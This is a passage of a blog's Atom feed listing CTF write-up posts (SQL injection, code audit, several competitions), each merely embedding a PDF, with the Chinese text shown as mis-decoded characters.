    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="ç¬¬å››å‘¨ä¸¤é“é¢˜wp(SQLæ³¨å…¥).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;ç¬¬å››å‘¨ä¸¤é“é¢˜wp(SQLæ³¨å…¥).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sqlæ³¨å…¥" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¬äºŒå‘¨å››é“é¢˜wp(ä»£ç å®¡è®¡)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/</id>
    <published>2020-03-13T15:24:35.000Z</published>
    <updated>2020-04-03T08:58:18.575Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="ç¬¬äºŒå‘¨å››é“é¢˜wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;ç¬¬äºŒå‘¨å››é“é¢˜wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sqlæ³¨å…¥" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020é«˜æ ¡æˆ˜ç–«CTF wp</title>
    <link href="https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/"/>
    <id>https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/</id>
    <published>2020-03-10T02:18:21.000Z</published>
    <updated>2020-03-10T02:20:53.574Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="2020é«˜æ ¡æˆ˜ç–«CTF__wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020é«˜æ ¡æˆ˜ç–«CTF__wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="ä¸ªäººctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF writeup Mini_Ginkgo</title>
    <link href="https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/"/>
    <id>https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/</id>
    <published>2020-01-02T13:31:42.000Z</published>
    <updated>2020-01-03T13:21:39.270Z</updated>
    
    <content type="html"><![CDATA[<p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="GXYCTF_writeup_Mini_Ginkgo.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;GXYCTF_writeup_Mini_Ginkgo.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pd
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="å›¢é˜Ÿctfç«èµ›" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
</feed>
